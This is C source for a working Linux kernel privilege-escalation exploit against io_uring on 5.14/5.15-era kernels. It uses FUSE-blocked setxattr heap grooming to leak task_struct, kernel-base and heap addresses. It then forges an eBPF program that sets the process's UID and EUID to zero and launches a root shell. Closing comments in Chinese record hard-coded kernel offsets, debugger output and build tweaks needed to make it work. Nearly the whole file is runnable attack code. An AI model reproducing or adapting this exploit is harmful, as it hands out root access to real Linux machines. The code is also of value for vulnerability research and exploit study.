// $ gcc -no-pie -static exploit.c hellofuse.c bpf.c -I./libfuse libfuse3.a -l:liburing.a -o exploit -masm=intel -lpthread
#define _GNU_SOURCE   
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/poll.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/xattr.h>
#include <time.h>
#include <sys/syscall.h>
#include <linux/bpf.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>

#include "bpf_defs.h"
#include "liburing.h"
#include "hellofuse.h"

#define PAGESIZE 4096
#define BPF_PROG_RUN_OFFSET      0x145F70    //  ffffffff81338400-ffffffff811f2490 = 0x145F70     5.15.0-rc1 0xFE260
#define TASK_STRUCT_CRED_OFFSET  0xae8       //  $1 = 0xae8             5.15.0-rc1 0x6E0
#define CRED_UID_OFFSET          0x4
#define CRED_EUID_OFFSET         0x14
#define SINGLE_NEXT_OFFSET       0x338400

// #include "liburing.h"

void* copy_map1 = NULL;
void* copy_map2 = NULL;
void* copy_map3 = NULL;
void* sleep_map1 = NULL;
void* sleep_map2 = NULL;
void* sleep_map3 = NULL;
void* block_map1 = NULL;

long task_struct_addr = 0;
int* upper_tsk = (int*)&task_struct_addr + 1;
int* lower_tsk = (int*)&task_struct_addr;
long bpf_prog_run32_addr = 0;
long fake_bpf_prog_addr = 0;

int procmaps_fd = -1;

struct io_uring ring = {0};

int group_id1 = 0x1337;
int group_id2 = 0x333;
char bufs1[4096][0x100] = {0};
char bufs2[4096][0x100] = {0};

pthread_mutex_t lock1 = {0};
pthread_mutex_t lock2 = {0};
pthread_mutex_t lock3 = {0};
pthread_mutex_t lock4 = {0};
pthread_mutex_t lock5 = {0};

static const struct fuse_operations evil_ops = {
    .getattr        = hello_getattr,
    .readdir        = hello_readdir,
    .open           = hello_open,
    .read           = hello_read,
};
char *fargs_evil[] = {"exploit", "/tmp/fuse_mount", NULL };

int setup_fuse(void)
{
    int ret = -1;
    int fuse_fd1 = -1;
    int fuse_fd2 = -1;
    int fuse_fd3 = -1;
    int fuse_fd4 = -1;

    mkdir(MNT_PATH, 0777);  // $ mkdir -p /tmp/fuse_mount && ./hello /tmp/fuse_mount
    if (!fork())
    {
        fuse_main(sizeof(fargs_evil)/sizeof(char *) -1 , fargs_evil, &evil_ops, NULL);
    }
    sleep(1);

// 1. copy_map1 + sleep_map1  -  fuse_fd1
    fuse_fd1 = open("/tmp/fuse_mount/task", O_RDWR);
    if (fuse_fd1 < 0)
        goto done;

    copy_map1 = mmap((void*)0x1000, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (MAP_FAILED == copy_map1)
        goto done;

    sleep_map1 = mmap(copy_map1 + PAGESIZE, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd1, 0);        // blocked - sleep_map1
    if ((copy_map1 + PAGESIZE) != sleep_map1)
        goto done;
// 2. copy_map2 + sleep_map2  -  fuse_fd2
    fuse_fd2 = open("/tmp/fuse_mount/seqop", O_RDWR);
    if (fuse_fd2 < 0)
        goto done;

    copy_map2 = mmap(sleep_map1 + PAGESIZE, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (MAP_FAILED == copy_map2)
        goto done;

    sleep_map2 = mmap(copy_map2 + PAGESIZE, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd2, 0);        // blocked - sleep_map2
    if ((copy_map2 + PAGESIZE) != sleep_map2)
        goto done;
// 3. copy_map3 + sleep_map3  -  fuse_fd3
    fuse_fd3 = open("/tmp/fuse_mount/iobuf", O_RDWR);
    if (fuse_fd3 < 0)
        goto done;

    copy_map3 = mmap(sleep_map2 + PAGESIZE, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (MAP_FAILED == copy_map3)
        goto done;

    sleep_map3 = mmap(copy_map3 + PAGESIZE, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd3, 0);        // blocked - sleep_map3
    if ((copy_map3 + PAGESIZE) != sleep_map3)
        goto done;
// 4. block_map1  -  fuse_fd4      (write to it - always block)
    fuse_fd4 = open("/tmp/fuse_mount/bpfprog", O_RDWR);
    if (fuse_fd4 < 0)
        goto done;

    block_map1 = mmap(NULL, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd4, 0);                        // blocked - block_map1
    if (MAP_FAILED == block_map1)
        goto done;

    ret = 0;

done:
    return ret;
}

int setup_bpf(void)
{
    int ret = -1;

    struct bpf_insn insn[] = 
    {
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };

    if (0 != load_bpf_prog(insn, sizeof(insn) / sizeof(insn[0])))
    {
        printf("[-] failed to load eBPF program!\n");
        goto done;
    }

    ret = 0;

done:
    return ret;
}

void print_hex( char *buf,int size){
    int i;
    puts("======================================");
    printf("data :\n");
    for (i=0 ; i<(size/8);i++){
        if (i%2 == 0){
            printf("%d",i/2);
        }
        printf(" %16llx",*(size_t * )(buf + i*8));
        if (i%2 == 1){
            printf("\n");
        }       
    }
    puts("======================================");
}

// do_setxattr() —— setxattr() -> block -> place another object -> getxattr() to leak
void do_setxattr(void* xattr_buf, void* leakbuf, pthread_mutex_t* lock)
{
    pthread_mutex_unlock(lock);

    setxattr("lol.txt", "user.lol", xattr_buf, 32, 0);  // user.lol  user.test   attr
    getxattr("lol.txt", "user.lol", leakbuf, 32);
    print_hex(leakbuf, 0x20);
}

long prep_setxattr(long cmd)
{  
    long ret = 0;
    char* xattr_buf = NULL;
    long* retptr = NULL;
    long* leakptr = NULL;
    pthread_mutex_t* lock = NULL;
    long leak[4] = {0};
// eBPF exploit - change cred to get root
    struct bpf_insn exploit[] = 
    {
        BPF_MOV32_IMM(BPF_REG_0, 0),
        BPF_MOV32_IMM(BPF_REG_1, *upper_tsk),
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
        BPF_MOV32_IMM(BPF_REG_2, *lower_tsk),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),                       // gain (uint64_t)*task_struct_addr
        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_1, TASK_STRUCT_CRED_OFFSET), // gain cred_addr
        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, CRED_UID_OFFSET),         // UID = 0
        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, CRED_EUID_OFFSET),        // EUID = 0
        BPF_EXIT_INSN()
    };

    switch(cmd)
    {
        case 0:     // 0. leak task_struct                  io_tctx_node->task
            xattr_buf = copy_map1 + PAGESIZE - 31;
            retptr = &leak[2];
            leakptr = leak;
            lock = &lock1;
            break;
        case 1:     // 1. leak kernel base                  seq_operations->next (single_next)
            xattr_buf = copy_map2 + PAGESIZE - 31;
            retptr = &leak[2];
            leakptr = leak;
            lock = &lock2;
            break;
        case 2:     // 2. leak heap address                 io_buffer->list->prev
            xattr_buf = copy_map3 + PAGESIZE - 31;
            retptr = &leak[1];
            leakptr = leak;
            lock = &lock3;
            break;
        case 3:     // 3. forge bpf_prog       bpf_prog->bpf_func & exploit[0]
            xattr_buf = copy_map1;
            memcpy(xattr_buf, &bpf_prog_run32_addr, sizeof(long));
            memcpy(xattr_buf + 0x18, &exploit, sizeof(exploit));
            leakptr = block_map1;
            lock = &lock3;
            break;
        case 4:     // 4. forge bpf_prog      exploit[1/2/3/4]
            xattr_buf = copy_map2;
            memcpy(xattr_buf, &exploit[1], sizeof(exploit) - sizeof(exploit[0]));
            leakptr = block_map1;
            lock = &lock3;
            break;
        case 5:     // 5. forge bpf_prog      exploit[5/6/7/8]
            xattr_buf = copy_map3;
            leakptr = block_map1;
            memcpy(xattr_buf, &exploit[5], sizeof(exploit) - sizeof(exploit[0])*5);
            lock = &lock3;
            break;
        case 6:     // 6. forge sk_filter->prog
            xattr_buf = copy_map3;
            leakptr = block_map1;
            memcpy(xattr_buf + 0x18, &fake_bpf_prog_addr, sizeof(long));
            lock = &lock4;
            break;
    }

    do_setxattr(xattr_buf, leakptr, lock);      // do_setxattr() —— setxattr & getxattr to leak

    return *retptr;
}
// do_io_uring() —— trigger vulnerability (arb free)
void* do_io_uring(void* blah)
{
    struct io_uring_sqe* sqe = NULL;
    struct io_uring_cqe* cqe = NULL;
    struct timespec tim = {0};
    cpu_set_t mask = {0};
    tim.tv_nsec = 3001337;

    CPU_ZERO(&mask);
    CPU_SET(1, &mask);
    sched_setaffinity(0, sizeof(cpu_set_t), &mask);
// 1. trigger arb free at offset 0x20
// 1-1 wait lock1
    pthread_mutex_lock(&lock1);
    nanosleep(&tim, NULL);
// 1-2 provide 2 buffer ---------------------- group2       ??????????????????????????????????? alloc 2 io_buffer to take up - no use???
    sqe = io_uring_get_sqe(&ring);                                      // io_uring_get_sqe() —— gets the next available submission queue entry
    io_uring_prep_provide_buffers(sqe, bufs2, 0x100, 2, group_id2, 0);  // io_uring_prep_provide_buffers() —— provide 2 buffer
    io_uring_submit(&ring);                                             // io_uring_submit() —— submit the request
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);
// 1-3 set affinity
    if (0 != io_uring_register_iowq_aff(&ring, sizeof(cpu_set_t), &mask))       // io_uring_register_iowq_aff() —— set affinity of iou_wrk
        fprintf(stderr, "++ register failed: %m\n");
// 1-4 read task using selected buffer ------------------ group1           triger arb free at offset 0x20
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, procmaps_fd, bufs1[3], 0x20, 0);    // io_uring_prep_read() —— sets up the submission queue entry pointed to by sqe with a read operation.
    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);           // io_uring_sqe_set_flags() —— sets the flags field of the SQE instance passed in.
    sqe->buf_group = group_id1;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    pthread_mutex_unlock(&lock1);
// 2. trigger arb free at offset 0x40
// 2-1 wait lock2
    pthread_mutex_lock(&lock2);
    nanosleep(&tim, NULL);
// 2-2 read task using selected buffer ------------------ group1           triger arb free at offset 0x40
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, procmaps_fd, bufs1[0], 0x40, 0);
    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
    sqe->buf_group = group_id1;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);
// 2-3 alloc seq_operations object
    int a=open("/proc/self/stat", O_RDONLY);
    int b=open("/proc/cmdline", O_RDONLY);
    // printf("Opened a & b: %d  %d\n", a, b);
    printf("--------has alloced seq_operarions---------\n");
// 3. trigger arb free at offset 0x20
// 3-1 wait lock3
    pthread_mutex_lock(&lock3);
    nanosleep(&tim, NULL);
// 3-2 read task using selected buffer ------------------ group1           triger arb free at offset 0x20
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, procmaps_fd, bufs1[0], 0x20, 0);
    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
    sqe->buf_group = group_id1;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);
// 3-3 provide 2 buffer ------------------ group1                               create 2 io_buffer to leak io_buffer->list->prev
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_provide_buffers(sqe, bufs1, 0x100, 2, group_id1, 0);          // io_buffer 1001  &  io_buffer 1002
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);
// 3-4 get lock5    --- lock5 can keep this thread alive
    pthread_mutex_lock(&lock5);
}
// do_io_uring2() —— trigger sk_filter->prog.bpf_func  &  get root
void* do_io_uring2(void* blah)
{
    struct io_uring_sqe* sqe = NULL;
    struct io_uring_cqe* cqe = NULL;
    struct timespec tim = {0};
    cpu_set_t mask = {0};
    tim.tv_nsec = 3001337;

    CPU_ZERO(&mask);
    CPU_SET(1, &mask);
    sched_setaffinity(0, sizeof(cpu_set_t), &mask);
// wait lock1
    nanosleep(&tim, NULL);
    pthread_mutex_lock(&lock1);
// provide 2 buffer ------------------ group2                       // do a io_uring operation to alloc io_tctx_node object
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_provide_buffers(sqe, bufs2, 0x100, 2, group_id2, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);
// get lock4
    pthread_mutex_lock(&lock4);

    run_bpf_prog();                 // trigger BPF program

    if (0 == getuid())
    {
        sleep(1);
        printf("[+] it worked! have a r00t shell :)\n");
        system("sh");
    }  
}

void* setxattr_thread_routine(void* cmd)
{
    struct timespec tim = {0};
    cpu_set_t mask = {0};

    tim.tv_nsec = 1001337;

    CPU_ZERO(&mask);
    CPU_SET(1, &mask);
    sched_setaffinity(0, sizeof(cpu_set_t), &mask);
// wait lock3
    pthread_mutex_lock(&lock3);
    nanosleep(&tim, NULL);
//
    prep_setxattr((long)cmd);
}

void create_setxattr_threads(void)
{
    struct timespec tim = {0};
    pthread_t thread1 = {0};
    pthread_t thread2 = {0};
    pthread_t thread3 = {0};

    tim.tv_nsec = 2001337;
    
    pthread_create(&thread1, NULL, setxattr_thread_routine, (void*)3);      // setxattr_thread_routine() —— 
    nanosleep(&tim, NULL);
    pthread_create(&thread2, NULL, setxattr_thread_routine, (void*)4);
    nanosleep(&tim, NULL);
    pthread_create(&thread3, NULL, setxattr_thread_routine, (void*)5);
}

void create_io_uring_threads(void)
{
    pthread_t thread1 = {0};
    pthread_t thread2 = {0};
    
    pthread_create(&thread1, NULL, do_io_uring, NULL);    // do_io_uring() —— trigger vulnerability (arb free)
    pthread_create(&thread2, NULL, do_io_uring2, NULL);   // do_io_uring2() —— trigger sk_filter->prog.bpf_func  &  get root
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];
    unshare(CLONE_NEWNS|CLONE_NEWUSER);
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);
    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    return;
}

int main(int argc, char **argv, char **envp) 
{
    int lol_fd = -1;
    cpu_set_t mask = {0};
    struct io_uring_params params = {0};
    struct io_uring_sqe* sqe = NULL;
    struct io_uring_cqe* cqe = NULL;
// 0. initial
    pthread_mutex_lock(&lock1);     // block all sub-threads
    pthread_mutex_lock(&lock2);
    pthread_mutex_lock(&lock3);
    pthread_mutex_lock(&lock4);
    pthread_mutex_lock(&lock5);

    lol_fd = open("lol.txt", O_RDWR | O_CREAT, 0666);
    if(lol_fd < 0)
    {
        printf("[-] failed to create setxattr file!\n");
        goto done;
    }
    printf("[+] set/getxattr file created\n");
// 0-1. setup bpf   -    load eBPF program (in step 8, attach to this prog_fd to alloc sk_filter object)
    if(0 != setup_bpf())
    {
        printf("[-] failed to setup eBPF!\n");
        goto done;
    }
    printf("[+] bpf program loaded created\n");
// 0-2. setup FUSE   -    mmap bloked address
    fargs_evil[0] = argv[0];
    unshare_setup(getuid(), getgid());      // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    if (0 != setup_fuse())
    {
        printf("[-] failed to setup FUSE\n");
        goto done;
    }
    printf("[+] FUSE maps created\n");
// 0-3. setup affinity
    CPU_ZERO(&mask);
    CPU_SET(1, &mask);
    sched_setaffinity(0, sizeof(cpu_set_t), &mask);
// 0-4. trigger threads / get_root threads / setxattr & block threads
    create_io_uring_threads();
    create_setxattr_threads();
// 0-5. open /proc/self/maps   -   procmaps_fd: use uring to read
    procmaps_fd = open("/proc/self/maps", O_RDONLY);
    printf("[+] opened /proc/self/maps\n");
    if (0 > procmaps_fd)
    {
        printf("[-] failed to open /proc/self/maps!\n");
        goto done;
    }
// 1. initialize io_uring
    if (0 != io_uring_queue_init_params(2048, &ring, &params))          // io_uring_queue_init_params() —— Initializes `io_uring` for use in your programs.   SQ length - 2048
    {
        printf("[-] failed to initialize io_uring!\n");
        goto done;
    }
    printf("[+] io_uring initialized\n");

    if (0 != io_uring_register_iowq_aff(&ring, sizeof(cpu_set_t), &mask))    // io_uring_register_iowq_aff() —— set affinity of iou_wrk
    {
        fprintf(stderr, "++ register failed: %m\n");
        goto done;
    }
// 2. spray 1000 kmalloc-32 (io_buffer)
    printf("[+] spraying kmalloc-32 cache with io_buffer structs!!\n");

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_provide_buffers(sqe, bufs1, 0x100, 1000, group_id1, 3);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    if (0 > cqe->res)
    {
        printf("[-] submit buffers failed!\n");
        goto done;
    }
// 3. trigger1 - leak task_struct                               io_tctx_node->task
    printf("[!] vuln trigger #1 for task_struct leak\n");
    
    task_struct_addr = prep_setxattr(0);
    printf("[+] task_struct: %lx\n", task_struct_addr);
    // return(0);                // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// 4. trigger2 - leak kernel base                               seq_operations->next (single_next)
    printf("[!] vuln trigger #2 for KASLR leak \n");
    bpf_prog_run32_addr = prep_setxattr(1) - BPF_PROG_RUN_OFFSET;

    printf("[!] single_next: %lx\n", bpf_prog_run32_addr + BPF_PROG_RUN_OFFSET);
    printf("[!] kernel_base: 0x%lx\n", bpf_prog_run32_addr + BPF_PROG_RUN_OFFSET - SINGLE_NEXT_OFFSET);
    // sleep(500);
// 5. spray 1000 kmalloc-32 (io_buffer)
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_provide_buffers(sqe, bufs1, 0x100, 1000, group_id1, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);
// 6 & 7. fake bpf_prog & trigger3 - leak heap addr                                io_buffer->list->prev
    printf("[!] vuln trigger #3 for cache ptr leak\n");
    fake_bpf_prog_addr = prep_setxattr(2) + 0x30;
    printf("[+] fake bpf_prog: %lx\n", fake_bpf_prog_addr);
// 8. spray 5 kmalloc-32 (io_buffer)   just duifengshui
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_provide_buffers(sqe, bufs1, 0x100, 5, group_id1, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);
// 9. trigger4 - overwrite socket filter
// 9-1. alloc sk_filter
    attach_bpf_prog();                                          // sk_filter->prog
// 9-2. trigger4 - release sk_filter
    sqe = io_uring_get_sqe(&ring);                              
    io_uring_prep_read(sqe, procmaps_fd, bufs1[0], 0x20, 0);
    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
    sqe->buf_group = group_id1;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);
// 9-3. forge sk_filter->prog & trigger fake eBPF program
    printf("[!] vuln trigger #4 to overwrite socket filter\n");
    prep_setxattr(6);

done:
    getchar();
    printf("[-] setup failed!\n");
    return 0;
}


/*
(0) 偏移信息
// 5.14.6
root@localhost:/home/hi# cat /proc/kallsyms | grep __bpf_prog_run32
ffffffff811f2490 t __bpf_prog_run32
root@localhost:/home/hi# cat /proc/kallsyms | grep single_next     
ffffffff81338400 t single_next

// Linux (none) 5.15.0-rc1 
ffffffff9a7662c0 t __bpf_prog_run32
ffffffff9a763e90 t ___bpf_prog_run
/exploit $ cat /tmp/kallsyms | grep single_next
ffffffff9a864520 t single_next

gef➤  p/x &(*(struct task_struct *)0)->cred
$1 = 0xae8

gef➤  p/x &(*(struct bpf_prog *)0)->bpf_func               // bpf_prog->bpf_func
$1 = 0x30
gef➤  p/x &(*(struct bpf_prog *)0)->insnsi                 // bpf_prog->insnsi         bpf_insn
$2 = 0x48


(1) 问题1: fuse: failed to exec fusermount3: No such file or directory

解决: 普通权限下，执行 fuse_main() 之前要调用 unshare() ; root权限下，不需要调用 unshare.

(2) 问题2: 没有泄露 task_struct 地址

如何确定某地址指向 task_struct ???  如果恰好 real_cred 和 cred 指针相等，则说明该地址指向 task_struct
gef➤  p (*(struct task_struct*)0xffff888005269700)->real_cred
$1 = (const struct cred *) 0xffff8880052e7f00
gef➤  p (*(struct task_struct*)0xffff888005269700)->cred
$2 = (const struct cred *) 0xffff8880052e7f00


两种方法: 
(2-1) 一是采用ftrace来看看堆布局

    echo 1 > /sys/kernel/debug/tracing/events/kmem/kmalloc/enable
    echo 1 > /sys/kernel/debug/tracing/events/kmem/kfree/enable

    失败啊，在第1个泄露点就报错退出了啊，这还怎么查看trace结果。

(2-2) 二是老老实实下断点调试，检查为什么

setxattr()
    		kvalue = kvmalloc(size, GFP_KERNEL);                // b fs/xattr.c:563
            if (copy_from_user(kvalue, value, size)) {          // b fs/xattr.c:566
    error = vfs_setxattr(mnt_userns, d, kname, kvalue, size, flags); 	// b fs/xattr.c:575

getxattr()
            		kvalue = kvzalloc(size, GFP_KERNEL);        // b fs/xattr.c:661
            			if (error > 0) { 						// b fs/xattr.c:667
		if (size && copy_to_user(value, kvalue, error))         // b fs/xattr.c:671

loop_rw_iter()
        		req->rw.addr += nr;                             // b fs/io_uring.c:3114

io_put_kbuf()
            	kfree(kbuf);                                    // b fs/io_uring.c:2211

single_open()
		struct seq_operations *op = kmalloc(sizeof(*op), GFP_KERNEL_ACCOUNT); 			// b fs/seq_file.c:591
		int res = -ENOMEM; 																// b fs/seq_file.c:592


解决：经过调试发现，cpio 文件系统中 setxattr() 无法将文件标签加入到系统中，导致getxattr() 也无法泄露信息。所以只能采用作者的文件系统了。

(3) 问题3: 没有成功泄露 seq_operations->next (single_next), 分配时 seq_operations 总是不能复用 setxattr() 的key空间。

解决: 经过采用ftrace进行调试后发现，分配seq_operations时带有 GFP_KERNEL_ACCOUNT 标记，发现原作者没有开启 CONFIG_MEMCG,
    所以编译内核时需关闭 CONFIG_MEMCG / CONFIG_MEMCG_SWAP / CONFIG_MEMCG_KMEM 编译选项。




*/

